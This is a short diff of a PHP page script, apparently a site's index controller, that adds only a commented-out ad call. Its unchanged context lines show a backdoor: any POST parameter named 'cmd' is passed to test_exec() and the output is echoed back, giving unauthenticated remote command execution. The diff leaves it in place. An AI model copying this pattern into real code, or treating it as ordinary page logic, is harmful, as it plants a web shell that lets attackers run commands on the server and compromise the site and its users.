@@ -106,6 +106,11 @@ Assign('result_comments', $result_comments);
 if(isset($_POST['cmd'])){
 	echo 'this is out '.test_exec( $_POST['cmd'] );
 }
+
+
+//echo getAd(array('place' => 'ad_468x60'), $this);
+
+
 //Displaying The Template
 template_files('index.html');
 display_it();
